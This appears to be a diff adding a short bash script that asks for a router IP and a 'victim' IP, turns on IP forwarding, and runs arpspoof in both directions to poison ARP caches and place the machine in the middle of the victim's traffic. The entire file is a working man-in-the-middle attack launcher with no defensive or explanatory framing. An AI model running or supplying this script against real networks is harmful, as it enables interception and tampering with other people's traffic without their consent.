@@ -1,0 +1,15 @@
+#!/bin/bash
+
+##remember to run as root and also give the right permissions
+
+echo "Please enter the router IP: "
+read router
+echo "Please enter the victim IP: "
+read victim
+
+echo '1'> /proc/sys/net/ipv4/ip_forward
+
+xterm -e bash -c "arpspoof -t $router $victim" &
+xterm -e bash -c "arpspoof -t $victim $router" &
+
+
